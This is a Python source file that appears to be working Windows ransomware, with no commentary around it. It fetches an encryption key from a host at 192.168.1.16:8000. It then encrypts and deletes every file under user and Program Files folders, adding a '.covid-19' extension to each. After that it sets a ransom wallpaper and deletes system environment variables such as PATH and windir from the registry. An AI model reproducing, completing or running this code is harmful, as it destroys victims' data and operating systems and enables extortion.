#!/usr/bin/python
#coding:utf-8
from cryptography.fernet import Fernet
import os, sys, socket, wget, struct, ctypes, shutil, time, winreg

#START THE SOCKET SERVER
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(("192.168.1.16", 8000))
enter = "[!] Transfert the key and the password :\n "
exit = "\n[!] Transfert [OK]"
sock.send(enter.encode())
print(sock.recv(2048).decode())
key = sock.recv(2048)
print(key)
sock.send(exit.encode())
sock.close()

#FILE ENCYPTING FUNCTION
def file_ecrypt(key, name):
    if (name!="Ransomware.py"):
        with open(name,'rb') as f:
            data = f.read()

        fernet = Fernet(key)
        encrypted = fernet.encrypt(data)
        encrypted_file = name + ".covid-19"
        try:
            with open(encrypted_file, 'wb') as f:
                f.write(encrypted)

            os.remove(name)
        except:
            pass

path = os.getcwd()
img = "\setup\image.jpg"
Wallpaper = "%s%s" %(path, img)
filePath = shutil.copy(Wallpaper, '\\PerfLogs\\image.jpg')
# WALLPAPER SETTINGS
SPI_SETDESKWALLPAPER = 20
WALLPAPER_PATH = '\\PerfLogs\\image.jpg'

def is_64_windows():
    """Find out how many bits is OS. """
    return struct.calcsize('P') * 8 == 64

def get_sys_parameters_info():
    """Based on if this is 32bit or 64bit returns correct version of SystemParametersInfo function. """
    return ctypes.windll.user32.SystemParametersInfoW if is_64_windows() \
        else ctypes.windll.user32.SystemParametersInfoA

def change_wallpaper():
    sys_parameters_info = get_sys_parameters_info()
    r = sys_parameters_info(SPI_SETDESKWALLPAPER, 0, WALLPAPER_PATH, 3)
    if not r:
        print(ctypes.WinError())
#LIST ALL FILES FOR PARTICULAR FILE EXTENTIONS AND INVOKE FILE ENCTYPT FUNCTION.
def filelist():
    spec = ['/users/', '/Program Files (x86)/', '/Program Files/']
    for i in spec:
        for root, dirs, files in os.walk(i):
            for file in files:
                for ext in file.split("."):
                    try:
                        if file.endswith(ext):
                            ally = os.path.join(root, file)
                            print(ally)
                            file_ecrypt(key, ally)
                    except PermissionError:
                        pass
filelist()
change_wallpaper()
# ENCRYPT THE FOLDER CONTAINS THE WALLPAPER
def filelist_aux():
    spec = "/PerfLogs/"
    for root, dirs, files in os.walk(spec):
        for file in files:
            for ext in file.split("."):
                if file.endswith(ext):
                    ally = os.path.join(root, file)
                    print(ally)
                    file_ecrypt(key, ally)
time.sleep(2)
filelist_aux()
# FUNCTION TO DELETE A SPECIAL REG ENVIRONMENT IN THE REGISTER
def delSpecRules():
    regs = ['TEMP', 'USERNAME', 'windir', 'OS', 'PATHEXT', 'PATH', 'PSModulePath']
    for reg in regs:
        cmd = '/windows/system32/reg.exe delete "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\Environment" /v %s /f' %(reg)
        os.system(cmd)
        time.sleep(2)
delSpecRules()
# FUNCTION TO DELETE A REG ENVIRONMENT IN THE REGISTER
def delRules():
    aKey = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment",0, winreg.KEY_ALL_ACCESS)
    for keys in range(0, 1024):
        try:
            keyname = winreg.EnumValue(aKey, keys)
            key, value, id = (keyname)
            cmd = '/windows/system32/reg.exe delete "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\Environment" /v %s /f' %(key)
            os.system(cmd)
        except OSError:
            pass
delRules()
